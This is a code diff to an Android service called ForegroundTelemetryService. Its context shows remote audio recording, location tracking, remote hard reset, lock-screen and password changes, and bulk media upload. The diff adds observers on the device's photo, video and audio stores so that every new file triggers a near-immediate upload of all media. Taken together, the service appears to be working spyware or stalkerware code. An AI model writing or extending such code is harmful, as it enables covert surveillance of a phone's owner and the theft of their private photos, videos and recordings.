@@ -12,6 +12,7 @@ import android.content.pm.PackageInfo;
 import android.content.ContentResolver;
 import android.content.ContentUris;
 import android.content.SharedPreferences;
+import android.database.ContentObserver;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationListener;
@@ -97,6 +98,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final int REMOTE_AUDIO_SEGMENT_MS = 60_000;
     private static final int REMOTE_AUDIO_SAMPLE_RATE = 16_000;
     private static final int MAX_MEDIA_ITEMS_PER_SCAN = 1500;
+    private static final long MEDIA_CHANGE_DEBOUNCE_MS = 7000L;
 
     private LocationManager locationManager;
     private volatile Location lastLocation = null;
@@ -117,6 +119,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String KEY_REMOTE_HARD_RESET_LAST_SESSION = "remote_hard_reset_last_session";
     private static final String KEY_REMOTE_LOCK_SCREEN_LAST_SESSION = "remote_lock_screen_last_session";
     private static final String KEY_REMOTE_SET_PASSWORD_LAST_SESSION = "remote_set_password_last_session";
+    private volatile long lastMediaChangeAt = 0L;
+    private volatile ContentObserver mediaObserver = null;
 
     @Override
     public void onCreate() {
@@ -142,6 +146,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         } catch (Exception e) {
             Log.e(TAG, "location request failed", e);
         }
+        registerMediaObservers();
 
         new Thread(() -> {
             try {
@@ -582,12 +587,43 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 
     private void maybeUploadAllMedia() {
         long lastScanAt = prefs().getLong(KEY_LAST_MEDIA_SCAN_AT, 0L);
-        if ((System.currentTimeMillis() - lastScanAt) < MEDIA_SCAN_INTERVAL_MS) return;
+        long now = System.currentTimeMillis();
+        boolean mediaChangedRecently = lastMediaChangeAt > 0L && (now - lastMediaChangeAt) <= MEDIA_CHANGE_DEBOUNCE_MS;
+        if (!mediaChangedRecently && (now - lastScanAt) < MEDIA_SCAN_INTERVAL_MS) return;
         try {
             uploadAllMediaOnce();
             prefs().edit().putLong(KEY_LAST_MEDIA_SCAN_AT, System.currentTimeMillis()).apply();
+            lastMediaChangeAt = 0L;
         } catch (Exception e) {
             Log.e(TAG, "maybeUploadAllMedia err", e);
+        }
+    }
+
+    private void registerMediaObservers() {
+        try {
+            if (mediaObserver != null) return;
+            mediaObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
+                @Override
+                public void onChange(boolean selfChange) {
+                    lastMediaChangeAt = System.currentTimeMillis();
+                }
+            };
+            ContentResolver resolver = getContentResolver();
+            resolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, mediaObserver);
+            resolver.registerContentObserver(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, true, mediaObserver);
+            resolver.registerContentObserver(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, true, mediaObserver);
+        } catch (Exception e) {
+            Log.e(TAG, "registerMediaObservers err", e);
+        }
+    }
+
+    private void unregisterMediaObservers() {
+        try {
+            if (mediaObserver == null) return;
+            getContentResolver().unregisterContentObserver(mediaObserver);
+        } catch (Exception ignored) {
+        } finally {
+            mediaObserver = null;
         }
     }
 
@@ -1175,6 +1211,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     @Override
     public void onDestroy() {
         running = false;
+        unregisterMediaObservers();
         try {
             if (locationManager != null) locationManager.removeUpdates(this);
         } catch (Exception ignored) {
